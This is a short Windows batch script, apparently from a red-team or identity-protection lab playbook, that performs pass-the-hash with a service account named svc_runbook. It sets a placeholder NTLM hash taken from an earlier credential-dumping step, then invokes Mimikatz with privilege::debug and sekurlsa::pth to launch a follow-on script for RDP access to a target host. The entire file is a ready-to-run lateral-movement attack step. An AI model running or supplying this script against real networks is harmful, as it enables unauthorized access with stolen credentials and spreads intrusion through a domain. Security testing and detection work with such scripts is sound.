@echo off
REM PtH_RDP_From_Unmanaged.bat — Pass-the-Hash with svc_runbook then RDP to BL
REM Update the NTLM hash below after dumping creds on DT/BL (Step 5)

set NTLM_HASH=PUT_SVC_RUNBOOK_HASH_HERE

echo [*] Pass-the-Hash with svc_runbook then RDP to BL...
echo [*] Domain: %ENV_DOMAIN%
echo [*] Target: %ENV_BL%
echo [*] NTLM:  %NTLM_HASH%
echo.

"C:\IDP_Files\Mimikatz\x64\mimikatz.exe" privilege::debug "sekurlsa::pth /user:svc_runbook /domain:%ENV_DOMAIN% /ntlm:%NTLM_HASH% /run:c:\IDP_Files\Post_PtH_RDP_From_Unmanaged.bat"
